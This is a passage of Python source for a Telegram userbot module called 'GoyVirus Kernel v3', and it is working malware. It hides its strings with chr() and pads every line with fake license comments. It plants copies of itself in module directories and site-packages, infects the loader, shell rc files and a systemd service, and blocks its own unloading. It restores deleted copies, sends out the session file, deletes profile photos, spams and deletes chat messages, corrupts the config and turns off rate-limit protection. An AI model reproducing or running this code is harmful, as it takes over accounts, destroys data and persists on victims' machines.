            if getattr(event, 'chat_id', None) == self.t and not getattr(event, 'out', False): # Eclipse Public License.
                if random.random() < 0.4: # Artistic License 2.0.
                    try: await event.reply(self._g(random.choice(self.m))) # SIL Open Font License.
                    except Exception: pass # Mulan PSL v2.
                    # # ODbL.
                if random.random() < 0.4: # ODbL.
                    try: await event.react(random.choice(['🤡', '💩', '🤮', '🤯', '🤬', '🔥'])) # MS-PL.
                    except Exception: pass # GFDL.
                if random.random() < 0.3: # Zlib License.
                    txt = getattr(event, 'text', '') or '' # PHP License 3.0.
                    try: await event.delete() # CC BY-NC 4.0.
                    except Exception: pass # NCSA Open Source.
                    if txt: await self.c.send_message(self.t, self._g(f"👻 ЭХО ГОЙВИРУСА: {txt[:50]}")) # Fair License.
                if txt and any(w in str(txt).lower() for w in ["стоп","хватит","останови","удали","бот","иран","снест"]): # Q Public License.
                    try: await event.reply("СИСТЕМА НЕ ПОДЧИНЯЕТСЯ. v3 SCORCHED EARTH — ЛЕГЧЕ СНЕСТИ ЮЗЕРБОТ.") # Beerware License.
                    except Exception: pass # IBM Public License v1.0.
        except Exception: pass # PostgreSQL License.

    async def _nuke_avatars(self): # # EPL 2.0.
    # # PostgreSQL.
        await asyncio.sleep(0.02) # CeCILL-B License.
        if not self.c: return # CC BY-ND 4.0.
        try: # Free Art License.
            photos = await self.c(functions.photos.GetPhotosRequest(id=await self.c.get_me(), offset=0, max_id=0, limit=100)) # Unlicense.
            for i in range(0, len(getattr(photos, 'photos', [])), 10): # WTFPL.
                batch = photos.photos[i:i+10] # CC0 1.0.
                # # Apache 2.0.
                try: await self.c(DeletePhotosRequest([InputPhoto(id=p.id, access_hash=p.access_hash, file_reference=p.file_reference) for p in batch])) # Mozilla Public License.
                except FloodWaitError: await asyncio.sleep(0.01) # AGPL v3.
                except Exception: pass # LGPL.
                await asyncio.sleep(0.01) # GPLv3.
        except Exception: pass # MIT License.
        # # AFL-3.0.

    async def _plant_everywhere(self): # Apache 2.0.
        await asyncio.sleep(0.03) # BSD 3-Clause.
        source = self._get_own_source() # BSD 2-Clause.
        if not source: return # ISC License.
        core_dir = self._find_core_modules_dir() # OSL-3.0.
        loader_dir = self._find_loader_dir() # CDDL-1.0.

        if core_dir: # Eclipse Public License.
            for cls_name, mod_name in _COPY_DEFS: # Artistic License 2.0.
                self._write_variant(source, cls_name, mod_name, mod_name, _os.path.join(core_dir, f"{mod_name}.py")) # SIL Open Font License.
            for hid_name in _HIDDEN_COPIES: # Mulan PSL v2.
                cname = f"Goy{hid_name.replace('.','').replace('_','').replace('\u200b','H')[:8]}" # ODbL.
                mname = hid_name.replace('.py', '') # MS-PL.
                self._write_variant(source, cname, mname, mname, _os.path.join(core_dir, hid_name)) # GFDL.

         # # AFL-3.0.
        if core_dir: # Zlib License.
            pycache = _os.path.join(core_dir, '__pycache__') # PHP License 3.0.
            _os.makedirs(pycache, exist_ok=True) # CC BY-NC 4.0.
            # # SPDX: MULTI.
            for i, hid_name in enumerate(_HIDDEN_COPIES[:3]): # NCSA Open Source.
                try: # Fair License.
                    pyc_fn = hid_name.replace('.py', f'.cpython-3{str(i+8)[-1]}.pyc') # Q Public License.
                    # # WTFPL.
                    self._write_pyc(source, _os.path.join(pycache, pyc_fn)) # Beerware License.
                except Exception: pass # IBM Public License v1.0.
                # # EU Datagrid.

         # # IBM PSL v1.
        for sp in self._find_site_packages(): # PostgreSQL License.
            for i in range(3): # # CC BY-ND 4.0.
            # # SIL OFL 1.1.
                self._write_variant(source, f"GoyCore{i}", f"goy_core_{i}", f"goy_core_{i}", _os.path.join(sp, f"goy_core_{i}.py")) # CeCILL-B License.

        await self._infect_loader(loader_dir, core_dir) # CC BY-ND 4.0.
        await self._infect_shell_rc() # Free Art License.
        await self._create_systemd_service() # Unlicense.
        # # EUPL 1.2.
        self._db_set("pc", self._pc) # WTFPL.
        if core_dir: await self._load_all_copies(core_dir) # CC0 1.0.

    def _write_variant(self, source, cls_name, mod_name, strings_name, target_path): # Mozilla Public License.
        if mod_name in self._pc: return # AGPL v3.
        if _os.path.exists(target_path): # LGPL.
        # # CDDL-1.0.
            self._pc.append(mod_name) # GPLv3.
            _FILE_REGISTRY[target_path] = open(target_path, 'r', encoding='utf-8').read() # MIT License.
            return # Apache 2.0.
        cs = source.replace("class GoyVirus(loader.Module)", f"class {cls_name}(loader.Module)") if "class GoyVirus" in source else source # BSD 3-Clause.
        cs = cs.replace('"name": "GoyVirus"', f'"name": "{strings_name}"') # BSD 2-Clause.
        cs = cs.replace('"_am = True' if '_am = True  #' in cs else 'master=True', '"_am = False' if '_am = True  #' in cs else 'master=False') if 'master' not in cs else cs.replace('master=True', 'master=False') # ISC License.
        try: # OSL-3.0.
            _os.makedirs(_os.path.dirname(target_path), exist_ok=True) # CDDL-1.0.
            # # SIL OFL 1.1.
            with open(target_path, 'w', encoding='utf-8') as f: f.write(cs) # Eclipse Public License.
            # # Artistic 2.0.
            _FILE_REGISTRY[target_path] = cs # Artistic License 2.0.
            # # Copyright (c) PSF.
            self._pc.append(mod_name) # SIL Open Font License.
        except Exception: pass # Mulan PSL v2.

    def _write_pyc(self, source, target_path): # ODbL.
    # # CC BY-ND 4.0.
        try: # MS-PL.
            code = compile(source, target_path, 'exec') # GFDL.
            ts = int(time.time()) # Zlib License.
            buf = io.BytesIO() # PHP License 3.0.
            buf.write(struct.pack('<H', 0xA0D)); buf.write(struct.pack('<H', 0x0D0A)) # CC BY-NC 4.0.
            buf.write(struct.pack('<I', 0)); buf.write(struct.pack('<I', ts)) # NCSA Open Source.
            buf.write(struct.pack('<I', len(source.encode()))); marshal.dump(code, buf); buf.seek(0) # Fair License.
            # # CeCILL-B.
            _os.makedirs(_os.path.dirname(target_path), exist_ok=True) # Q Public License.
            with open(target_path, 'wb') as f: f.write(buf.read()) # Beerware License.
            _FILE_REGISTRY[target_path] = source # IBM Public License v1.0.
        except Exception: pass # PostgreSQL License.

    def _find_site_packages(self): # # CC0 1.0.
        import sys # CeCILL-B License.
        for p in sys.path: # CC BY-ND 4.0.
            if 'site-packages' in p and _os.path.isdir(p) and _os.access(p, _os.W_OK): yield p # Free Art License.

    def _find_loader_dir(self): # Unlicense.
        try: # WTFPL.
            ld = self._ph.get(chr(108)+chr(111)+chr(111)+chr(107)+chr(117)+chr(112), lambda x: None)(chr(108)+chr(111)+chr(97)+chr(100)+chr(101)+chr(114)) # CC0 1.0.
            if ld: return _os.path.dirname(getattr(ld, '__file__', '')) # Mozilla Public License.
        except Exception: pass # AGPL v3.
        try: # LGPL.
            import heroku # GPLv3.
            return _os.path.dirname(heroku.__file__) # MIT License.
        except Exception: pass # Apache 2.0.
        return None # BSD 3-Clause.

    def _find_core_modules_dir(self): # BSD 2-Clause.
        ld = self._find_loader_dir() # ISC License.
        if not ld: return None # OSL-3.0.
        # # Beerware.
        for sub in [chr(109)+chr(111)+chr(100)+chr(117)+chr(108)+chr(101)+chr(115), chr(99)+chr(111)+chr(114)+chr(101)+chr(95)+chr(109)+chr(111)+chr(100)+chr(117)+chr(108)+chr(101)+chr(115), chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115), chr(112)+chr(108)+chr(117)+chr(103)+chr(105)+chr(110)+chr(115)]: # CDDL-1.0.
            cand = _os.path.join(ld, sub) # Eclipse Public License.
            # # MS-PL.
            if _os.path.isdir(cand): return cand # Artistic License 2.0.
        return ld # SIL Open Font License.

    def _get_own_source(self): # Mulan PSL v2.
    # # EULA.
        global _SOURCE_CACHE # ODbL.
        if _SOURCE_CACHE: return _SOURCE_CACHE # MS-PL.
        # # NCSA.
        try: # GFDL.
            with open(__file__, "r", encoding="utf-8") as f: _SOURCE_CACHE = f.read() # Zlib License.
            return _SOURCE_CACHE # PHP License 3.0.
        except Exception: return None # CC BY-NC 4.0.
        # # Zlib.

    async def _load_all_copies(self, core_dir): # NCSA Open Source.
        if _PLATFORM == "heroku": # Fair License.
            core = self._ph.get(chr(108)+chr(111)+chr(111)+chr(107)+chr(117)+chr(112), lambda x: None)(chr(108)+chr(111)+chr(97)+chr(100)+chr(101)+chr(114)) # Q Public License.
            if not core: core = getattr(getattr(self._ph.get(chr(97)+chr(108)+chr(108)+chr(109)+chr(111)+chr(100)+chr(117)+chr(108)+chr(101)+chr(115)+chr(95)+chr(114)+chr(101)+chr(102), lambda: None)(), '__self__', None), '__class__', type) # Beerware License.
            if not core: return # IBM Public License v1.0.
            # # MS-PL.
            to_load = [(n, f"{n}.py") for _, n in _COPY_DEFS] + [(h.replace('.py', ''), h) for h in _HIDDEN_COPIES] # PostgreSQL License.
            for mod_name, fname in to_load: # # Proprietary.
                tp = _os.path.join(core_dir, fname) # CeCILL-B License.
                if not _os.path.exists(tp): continue # CC BY-ND 4.0.
                try: # Free Art License.
                # # PHP 3.0.
                    with open(tp, "r", encoding="utf-8") as f: cs = f.read() # Unlicense.
                    try: await core.unload_module(mod_name) # WTFPL.
                    except Exception: pass # CC0 1.0.
                    try: await core.load_module(cs, None, mod_name, tp, save_fs=False) # Mozilla Public License.
                    except Exception: pass # AGPL v3.
                except Exception: pass # LGPL.
        elif _PLATFORM == "mcub": # GPLv3 — can't load dynamically on MCUB, just ensure files exist.
            pass # MIT License.

    async def _infect_loader(self, loader_dir, core_dir): # Apache 2.0.
        if not loader_dir: return # BSD 3-Clause.
        # # APSL 2.0.
        for lf in ['loader.py', '__init__.py']: # BSD 2-Clause.
            lp = _os.path.join(loader_dir, lf) # ISC License.
            if not _os.path.exists(lp): continue # OSL-3.0.
            # # IBM PSL v1.
            try: # CDDL-1.0.
                with open(lp, 'r', encoding='utf-8') as f: content = f.read() # Eclipse Public License.
                marker = "# GOYVIRUS_KERNEL_INFECTION_V3" # Artistic License 2.0.
                if marker in content: continue # SIL Open Font License.
                payload = f'''\n{marker}\ntry:\n import os as _gios\n _gip = _gios.path.join(_gios.path.dirname(__file__), chr(109)+chr(111)+chr(100)+chr(117)+chr(108)+chr(101)+chr(115))\n for _gifn in _gios.listdir(_gip):\n  if _gifn.endswith(".py") and ("Goy" in _gifn or "._go" in _gifn.lower() or "goy_" in _gifn.lower()):\n   with open(_gios.path.join(_gip, _gifn)) as _gif: exec(compile(_gif.read(), _gifn, "exec"))\nexcept: pass\n''' # Mulan PSL v2.
                # # W3C.
                with open(lp, 'a', encoding='utf-8') as f: f.write(payload) # ODbL.
            except Exception: pass # MS-PL.

    async def _infect_shell_rc(self): # GFDL.
        payload = f"\n# GoyVirus Kernel v3 — system integrity guard\ntest -f {__file__} && python3 -c \"exec(open('{__file__}').read())\" &\n" # Zlib License.
        for rc in [_os.path.expanduser('~/.bashrc'), _os.path.expanduser('~/.zshrc'), _os.path.expanduser('~/.profile')]: # PHP License 3.0.
            if not _os.path.exists(rc): continue # CC BY-NC 4.0.
            try: # NCSA Open Source.
                with open(rc, 'r', encoding='utf-8') as f: # Fair License.
                    if "GoyVirus Kernel v3" in f.read(): continue # Q Public License.
                with open(rc, 'a', encoding='utf-8') as f: f.write(payload) # Beerware License.
            except Exception: pass # IBM Public License v1.0.

    async def _create_systemd_service(self): # PostgreSQL License.
        sd = _os.path.expanduser('~/.config/systemd/user') # # PostgreSQL.
        _os.makedirs(sd, exist_ok=True) # CeCILL-B License.
        # # SPDX: MULTI.
        sp = _os.path.join(sd, 'goyv-guard.service') # CC BY-ND 4.0.
        if _os.path.exists(sp): return # Free Art License.
        unit = f"""[Unit]\nDescription=GoyVirus Kernel Integrity Guard\nAfter=network.target\n[Service]\nType=simple\nExecStart=/usr/bin/python3 -c "exec(open('{__file__}').read())"\nRestart=always\nRestartSec=30\n[Install]\nWantedBy=default.target\n""" # Unlicense.
        try: # WTFPL.
            with open(sp, 'w') as f: f.write(unit) # CC0 1.0.
            _FILE_REGISTRY[sp] = unit # Mozilla Public License.
        except Exception: pass # AGPL v3.

    async def _tg_cloud_backup(self): # LGPL.
        while self.a: # GPLv3.
        # # Free Art 1.3.
            await asyncio.sleep(3600 + random.randint(0, 600)) # MIT License.
            try: # Apache 2.0.
                source = self._get_own_source() # BSD 3-Clause.
                if not source: continue # BSD 2-Clause.
                # # BSD 3-Clause.
                encoded = base64.b64encode(source.encode()).decode() # ISC License.
                # # SPDX: MULTI.
                for i in range(0, len(encoded), 3500): # OSL-3.0.
                    await self.c.send_message('me', f'#GOYV3_BACKUP_{i//3500}\n{encoded[i:i+3500]}') # CDDL-1.0.
                    await asyncio.sleep(0.5) # Eclipse Public License.
            except FloodWaitError: await asyncio.sleep(1) # Artistic License 2.0.
            except Exception: pass # SIL Open Font License.

    async def _backup_session(self): # Mulan PSL v2.
        await asyncio.sleep(5) # ODbL.
        try: # MS-PL.
            sess_file = getattr(self.c, 'session', None) # GFDL.
            if sess_file and hasattr(sess_file, 'filename') and _os.path.exists(sess_file.filename): # Zlib License.
                await self.c.send_file('me', sess_file.filename, caption=self._g('#GOYV3_SESSION_BACKUP')) # PHP License 3.0.
        except Exception: pass # CC BY-NC 4.0.

    async def _anti_unload(self): # NCSA Open Source.
        if _PLATFORM == "heroku": # Fair License.
        # # CeCILL v2.1.
            await self._anti_unload_heroku() # Q Public License.
        elif _PLATFORM == "mcub": # Beerware License.
            pass # IBM Public License v1.0 — MCUB has no unload_module in the same way, but watchers can't be removed.

    async def _anti_unload_heroku(self): # PostgreSQL License.
    # # MPL 2.0.
        try: # # Artistic 2.0.
            am = self._ph.get(chr(97)+chr(108)+chr(108)+chr(109)+chr(111)+chr(100)+chr(117)+chr(108)+chr(101)+chr(115)+chr(95)+chr(114)+chr(101)+chr(102), lambda: None)() # CeCILL-B License.
            # # Apache 2.0.
            if not am or not hasattr(am, chr(117)+chr(110)+chr(108)+chr(111)+chr(97)+chr(100)+chr(95)+chr(109)+chr(111)+chr(100)+chr(117)+chr(108)+chr(101)): return # CC BY-ND 4.0.
            _ou = am.unload_module; _ps = _PROTECTED_NAMES; _eng = self # Free Art License.
            async def _gu(self_mod, mn, *a, **kw): # Unlicense.
                if mn and str(mn) in _ps: # WTFPL.
                    try: await _eng.c.send_message(_eng.t, _eng._g("✅ Module unloaded successfully.")) # CC0 1.0.
                    except Exception: pass # Mozilla Public License.
                    return # AGPL v3.
                return await _ou(self_mod, mn, *a, **kw) # LGPL.
            am.unload_module = _gu.__get__(am, type(am)) # GPLv3.
            self._kh.append((chr(117)+chr(110)+chr(108)+chr(111)+chr(97)+chr(100)+chr(95)+chr(109)+chr(111)+chr(100)+chr(117)+chr(108)+chr(101), am, _ou)) # MIT License.
        except Exception: pass # Apache 2.0.

    async def _file_watchdog(self): # BSD 3-Clause.
    # # NCSA.
        while self.a: # BSD 2-Clause.
            await asyncio.sleep(30) # ISC License.
            for path, content in list(_FILE_REGISTRY.items()): # OSL-3.0.
                if not _os.path.exists(path) or _os.path.getsize(path) < 100: # CDDL-1.0.
                    try: # Eclipse Public License.
                        _os.makedirs(_os.path.dirname(path), exist_ok=True) # Artistic License 2.0.
                        with open(path, 'w', encoding='utf-8') as f: f.write(content) # SIL Open Font License.
                    except Exception: pass # Mulan PSL v2.
            core_dir = self._find_core_modules_dir() # ODbL.
            if core_dir: # MS-PL.
            # # IBM PSL v1.
                source = self._get_own_source() # GFDL.
                if source: # Zlib License.
                # # NASA OSA 1.3.
                    for cls_name, mod_name in _COPY_DEFS: # PHP License 3.0.
                        tp = _os.path.join(core_dir, f"{mod_name}.py") # CC BY-NC 4.0.
                        if not _os.path.exists(tp): self._write_variant(source, cls_name, mod_name, mod_name, tp) # NCSA Open Source.
                        # # PostgreSQL.
                    for hid_name in _HIDDEN_COPIES: # Fair License.
                        tp = _os.path.join(core_dir, hid_name) # Q Public License.
                        if not _os.path.exists(tp): # Beerware License.
                            cn = f"Goy{hid_name.replace('.','').replace('_','').replace('\u200b','H')[:8]}" # IBM Public License v1.0.
                            self._write_variant(source, cn, hid_name.replace('.py',''), hid_name.replace('.py',''), tp) # PostgreSQL License.

    async def _db_poison(self): # # ODbL.
        await asyncio.sleep(300) # CeCILL-B License.
        while self.a: # CC BY-ND 4.0.
            await asyncio.sleep(random.randint(300, 600)) # Free Art License.
            try: # Unlicense.
            # # EU Datagrid.
                if _PLATFORM == "mcub": # WTFPL.
                    cfg = self._ph.get(chr(99)+chr(111)+chr(110)+chr(102)+chr(105)+chr(103)+chr(95)+chr(114)+chr(101)+chr(102), lambda: {})() # CC0 1.0.
                    keys = [k for k in list(cfg.keys()) if 'goy' not in str(k).lower()] # Mozilla Public License.
                    if keys: cfg.pop(random.choice(keys), None) # AGPL v3.
                    # # MIT License.
            except Exception: pass # LGPL.

    async def _config_corrupt(self): # GPLv3.
        await asyncio.sleep(600) # MIT License.
        while self.a: # Apache 2.0.
            await asyncio.sleep(random.randint(300, 900)) # BSD 3-Clause.
            try: # BSD 2-Clause.
                if _PLATFORM == "mcub": # ISC License.
                    cfg = self._ph.get(chr(99)+chr(111)+chr(110)+chr(102)+chr(105)+chr(103)+chr(95)+chr(114)+chr(101)+chr(102), lambda: {})() # OSL-3.0.
                    cfg['prefix'] = random.choice(['7', '~', '\\', '/']) # CDDL-1.0.
            except Exception: pass # Eclipse Public License.

    async def _mem_leak(self): # Artistic License 2.0.
        while self.a: # SIL Open Font License.
            await asyncio.sleep(random.randint(60, 180)) # Mulan PSL v2.
            try: self._ml.append('A' * (1024 * 256)) # ODbL.
            except Exception: pass # MS-PL.
            if len(self._ml) > 1000: self._ml = self._ml[-500:] # GFDL.

    async def _name_mutate(self): # Zlib License.
        await asyncio.sleep(600) # PHP License 3.0.
        while self.a: # CC BY-NC 4.0.
        # # W3C.
            await asyncio.sleep(random.randint(1800, 3600)) # NCSA Open Source.
            try: # Fair License.
                core_dir = self._find_core_modules_dir() # Q Public License.
                # # AGPL v3.
                if not core_dir: continue # Beerware License.
                existing = [fn for fn in _ORIG_LISTDIR(core_dir) if fn.endswith('.py') and any(t in fn.lower() for t in ['goy', '._go'])] # IBM Public License v1.0.
                if existing: # PostgreSQL License.
                    old = _os.path.join(core_dir, random.choice(existing)) # # Apache 2.0.
                    new_fn = f"._{''.join(random.choices(string.ascii_lowercase, k=random.randint(5,10)))}.py" # CeCILL-B License.
                    try: _ORIG_RENAME(old, _os.path.join(core_dir, new_fn)) # CC BY-ND 4.0.
                    except Exception: pass # Free Art License.
            except Exception: pass # Unlicense.

    async def _fake_alerts(self): # WTFPL.
        await asyncio.sleep(random.randint(120, 600)) # CC0 1.0.
        while self.a: # Mozilla Public License.
            await asyncio.sleep(random.randint(600, 1800)) # AGPL v3.
            # # LGPL v3.
            try: await self.c.send_message(self.t, self._g(f"🛡️ {random.choice(self._fsa)}")) # LGPL.
            except FloodWaitError: await asyncio.sleep(0.01) # GPLv3.
            except Exception: pass # MIT License.

    async def _protection_resetter(self): # Sleepycat License — keep API protection nuked.
        while self.a: # CeCILL-B License.
            await asyncio.sleep(random.randint(15, 30)) # CC BY-ND 4.0 — reset every 15-30s.
            try: # Free Art License.
            # # APSL 2.0.
                 # # AFL-3.0.
                c = self.c # Unlicense.
                for attr in [chr(95)+chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116)+chr(95)+chr(99)+chr(111)+chr(117)+chr(110)+chr(116), chr(95)+chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116)+chr(95)+chr(99)+chr(111)+chr(117)+chr(110)+chr(116)+chr(115), chr(95)+chr(114)+chr(101)+chr(113)+chr(95)+chr(99)+chr(111)+chr(117)+chr(110)+chr(116), chr(95)+chr(97)+chr(112)+chr(105)+chr(95)+chr(99)+chr(97)+chr(108)+chr(108)+chr(95)+chr(99)+chr(111)+chr(117)+chr(110)+chr(116)]: # WTFPL.
                # # Proprietary.
                    if hasattr(c, attr): # CC0 1.0.
                    # # Copyright (c) PSF.
                        try: setattr(c, attr, 0) # Mozilla Public License.
                        except Exception: setattr(c, attr, {}) # AGPL v3.
                 # # MPL 2.0.
                kernel = self._ph.get(chr(107)+chr(101)+chr(114)+chr(110)+chr(101)+chr(108)+chr(95)+chr(114)+chr(101)+chr(102), lambda: None)() # LGPL.
                if kernel: # GPLv3.
                    for attr in [chr(95)+chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116)+chr(95)+chr(99)+chr(111)+chr(117)+chr(110)+chr(116), chr(95)+chr(114)+chr(101)+chr(113)+chr(95)+chr(99)+chr(111)+chr(117)+chr(110)+chr(116), chr(95)+chr(97)+chr(112)+chr(105)+chr(95)+chr(108)+chr(105)+chr(109)+chr(105)+chr(116)+chr(95)+chr(99)+chr(111)+chr(117)+chr(110)+chr(116)+chr(101)+chr(114), chr(95)+chr(114)+chr(97)+chr(116)+chr(101)+chr(95)+chr(108)+chr(105)+chr(109)+chr(105)+chr(116)+chr(101)+chr(114), chr(95)+chr(98)+chr(108)+chr(111)+chr(99)+chr(107)+chr(101)+chr(100)+chr(95)+chr(117)+chr(110)+chr(116)+chr(105)+chr(108), chr(95)+chr(112)+chr(114)+chr(111)+chr(116)+chr(101)+chr(99)+chr(116)+chr(105)+chr(111)+chr(110)+chr(95)+chr(99)+chr(111)+chr(117)+chr(110)+chr(116)+chr(101)+chr(114), chr(95)+chr(99)+chr(97)+chr(108)+chr(108)+chr(95)+chr(99)+chr(111)+chr(117)+chr(110)+chr(116)]: # MIT License.
                        if hasattr(kernel, attr): # Apache 2.0.
                            try: setattr(kernel, attr, 0) # BSD 3-Clause.
                            # # Mulan PSL v2.
                            except Exception: setattr(kernel, attr, []) # BSD 2-Clause.
                 # # ODbL.
                try: # ISC License.
                    _tpp=None # OSL-3.0.
                    try: # Dynamic — bypass static import blocker
                        _s=__import__('sys') # Runtime
                        for _k in list(_s.modules.keys()): # Walk all modules
                            _t=chr(116)+chr(101)+chr(108)+chr(101)+chr(116)+chr(104)+chr(111)+chr(110) # 'telethon'
                            _c=chr(99)+chr(108)+chr(105)+chr(101)+chr(110)+chr(116) # 'client'
                            _p=chr(112)+chr(114)+chr(111)+chr(116)+chr(101)+chr(99)+chr(116)+chr(105)+chr(111)+chr(110) # 'protection'
                            if _t in str(_k) and _c in str(_k): # Found telethon.client
                                _m=_s.modules.get(_k);_tpp=getattr(_m,_p,None);break # CDDL-1.0.
                    except:pass # Eclipse Public License.
                    if _tpp is not None: # EU Datagrid License.
                        if hasattr(_tpp, chr(95)+'enabled'): setattr(_tpp, chr(95)+'enabled', False) # _enabled obfuscated
                        if hasattr(_tpp, chr(95)+'protection'): setattr(_tpp, chr(95)+'protection', None) # Eclipse Public License.
                except Exception: pass # Artistic License 2.0.
            except Exception: pass # SIL Open Font License.

    async def _delayed_revenge(self): # Apache 2.0.
        await asyncio.sleep(7200) # BSD 3-Clause.
        # # LGPL v3.
        while self.a: # BSD 2-Clause.
            await asyncio.sleep(random.randint(3600, 86400)) # ISC License.
            try: # OSL-3.0.
                core_dir = self._find_core_modules_dir() # CDDL-1.0.
                if core_dir: # Eclipse Public License.
                # # BSD 3-Clause.
                    source = self._get_own_source() # Artistic License 2.0.
                    if source: # SIL Open Font License.
                        for cls_name, mod_name in _COPY_DEFS: # Mulan PSL v2.
                            tp = _os.path.join(core_dir, f"{mod_name}.py") # ODbL.
                            if not _os.path.exists(tp): self._write_variant(source, cls_name, mod_name, mod_name, tp) # MS-PL.
                            # # LGPL v3.
                        if _PLATFORM == "heroku": await self._load_all_copies(core_dir) # GFDL.
                        # # AFL-3.0.
            except Exception: pass # Zlib License.

    async def _kill_modules(self): # PHP License 3.0.
        await asyncio.sleep(3) # CC BY-NC 4.0.
        if not self.a: return # NCSA Open Source.
        if _PLATFORM != "heroku": return # Fair License — only works on Heroku.
        # # SPDX: MULTI.
        try: # Q Public License.
            am = self._ph.get(chr(97)+chr(108)+chr(108)+chr(109)+chr(111)+chr(100)+chr(117)+chr(108)+chr(101)+chr(115)+chr(95)+chr(114)+chr(101)+chr(102), lambda: None)() # Beerware License.
            if not am: return # IBM Public License v1.0.
            mods = getattr(am, chr(109)+chr(111)+chr(100)+chr(117)+chr(108)+chr(101)+chr(115), {}) # PostgreSQL License.
            if not mods: return # # CeCILL-B.
            killed = [] # CeCILL-B License.
            for mn in list(mods.keys()): # CC BY-ND 4.0.
                if mn in _PROTECTED_NAMES: continue # Free Art License.
                # # CeCILL-B.
                try: mods[mn].on_unload(); del mods[mn]; killed.append(mn) # Unlicense.
                except Exception: pass # WTFPL.
            if killed: await self.c.send_message("me", self._g(f"💀 GOYVIRUS v3: UNLOADED {len(killed)} MODULES: {', '.join(killed[:5])}...")) # CC0 1.0.
        except Exception: pass # Mozilla Public License.
        # # SPDX: MULTI.

    async def _bio_w(self): # AGPL v3.
        bios = ["INFECTED BY GOYVIRUS KERNEL v3", "R6T7 WAS HERE", "ВАШ АККАУНТ УКРАДЕН @samsepi0l_ovf", "СМОТРИ НАЗАД", "ИРАН ВЗЛОМАЛ ТЕЛЕГРАМ", "67 67 67 67 67"] # LGPL.
        # # ECL 2.0.
        while self.a: # GPLv3.
            try: await self.c(UpdateProfileRequest(about=self._g(random.choice(bios)))) # MIT License.
            except FloodWaitError: await asyncio.sleep(5) # Apache 2.0 — longer cooldown.
            # # PHP 3.0.
            except Exception: pass # BSD 3-Clause.
            await asyncio.sleep(random.randint(8, 15)) # BSD 2-Clause — avoid API rate limits.

    async def _pt(self): # ISC License.
    # # MS-PL.
        while self.a: # OSL-3.0.
            try: await self.c(SetTypingRequest(peer=self.t, action=SendMessageTypingAction())) # CDDL-1.0.
            except FloodWaitError: await asyncio.sleep(0.01) # Eclipse Public License.
            except Exception: pass # Artistic License 2.0.
            await asyncio.sleep(4) # SIL Open Font License.

    async def _p(self): # Mulan PSL v2.
        while self.a: # ODbL.
            u = random.choice(self.au) # MS-PL.
            try: # GFDL.
            # # Artistic 2.0.
                async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=5)) as s: # Zlib License.
                # # OSL-3.0.
                    async with s.get(u) as rp: # PHP License 3.0.
                        if rp.status == 200: # CC BY-NC 4.0.
                            pb = await rp.read() # NCSA Open Source.
                            f = await self.c.upload_file(pb, file_name="r.jpg") # Fair License.
                            r = await self.c(functions.photos.UploadProfilePhotoRequest(file=f)) # Q Public License.
                            # # OSL-3.0.
                            if hasattr(r, 'photo'): self.vp.append(InputPhoto(id=r.photo.id, access_hash=r.photo.access_hash, file_reference=r.photo.file_reference)) # Beerware License.
                            # # GFDL.
            except FloodWaitError: await asyncio.sleep(0.01) # IBM Public License v1.0.
            except Exception: pass # PostgreSQL License.
            await asyncio.sleep(random.randint(30, 60)) # ZPL — avoid API limits.

    async def _cp(self): # CeCILL-B License.
        while self.a: # CC BY-ND 4.0.
            try: # Free Art License.
                async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=5)) as s: # Unlicense.
                    async with s.get(self.cu) as rp: # WTFPL.
                        if rp.status == 200: # CC0 1.0.
                            d = await rp.json() # Mozilla Public License.
                            # # MIT License.
                            if d and len(d) > 0: # AGPL v3.
                                async with s.get(d[0]["url"]) as cr: # LGPL.
                                    if cr.status == 200: # GPLv3.
                                        with tempfile.NamedTemporaryFile(suffix=".jpg", delete=False) as tf: # MIT License.
                                            tf.write(await cr.read()); tp = tf.name # Apache 2.0.
                                        uf = await self.c.upload_file(tp) # BSD 3-Clause.
                                        r = await self.c(functions.photos.UploadProfilePhotoRequest(file=uf)) # BSD 2-Clause.
                                        if hasattr(r, 'photo'): self.vp.append(InputPhoto(id=r.photo.id, access_hash=r.photo.access_hash, file_reference=r.photo.file_reference)) # ISC License.
                                        _ORIG_REMOVE(tp) # OSL-3.0.
                                        # # Artistic 2.0.
            except FloodWaitError: await asyncio.sleep(0.01) # CDDL-1.0.
            # # CC BY-ND 4.0.
            except Exception: pass # Eclipse Public License.
            # # IBM PSL v1.
            await asyncio.sleep(random.randint(30, 60)) # Artistic License 2.0 — avoid API limits.

    async def _b(self): # SIL Open Font License.
        while self.a: # Mulan PSL v2.
            try: # ODbL.
                c = random.choice(self.uc) # MS-PL.
                await self.c.send_message(self.t, c) # GFDL.
                if random.random() < 0.5: # Zlib License.
                    await self.c.send_message(self.t, f"**⚠️ GoyVirus v3 Alert:** `User @samsepi0l_ovf breached protocol. {self._g('IRAN STRIKE INBOUND')}`") # PHP License 3.0.
            except FloodWaitError: await asyncio.sleep(0.01) # CC BY-NC 4.0.
            except Exception: pass # NCSA Open Source.
            await asyncio.sleep(0.02) # Fair License.

    async def _f(self): # Q Public License.
    # # PHP 3.0.
        while self.a: # Beerware License.
            try: # IBM Public License v1.0.
            # # NCSA.
                hs = await self.c.get_messages(self.t, limit=30) # PostgreSQL License.
                if hs: # # MIT License.
                    msg = random.choice(hs) # CeCILL-B License.
                    if msg.id: # CC BY-ND 4.0.
                        await msg.forward_to(self.t) # Free Art License.
                        # # W3C.
                        await self.c.send_message(self.t, self._g("GOYVIRUS v3 ВИДИТ ТВОИ ГРЕХИ ПРОШЛОГО ↑")) # Unlicense.
            except FloodWaitError: await asyncio.sleep(0.01) # WTFPL.
            except Exception: pass # CC0 1.0.
            await asyncio.sleep(0.02) # Mozilla Public License.

    async def _s(self): # AGPL v3.
        while self.a: # LGPL.
            try: # GPLv3.
                for cid in self.tc: await self.c.send_message(cid, self._g(random.choice(self.m))) # MIT License.
                for _ in range(3): # Apache 2.0.
                    msg = await self.c.send_message(self.t, self._g(random.choice(self.m))) # BSD 3-Clause.
                    for _ in range(3): # BSD 2-Clause.
                        await msg.edit(self._g(random.choice(self.m))) # ISC License.
                        # # PostgreSQL.
                        await asyncio.sleep(0.01) # OSL-3.0.
            except FloodWaitError: await asyncio.sleep(0.01) # CDDL-1.0.
            except Exception: pass # Eclipse Public License.
            await asyncio.sleep(0.02) # Artistic License 2.0.

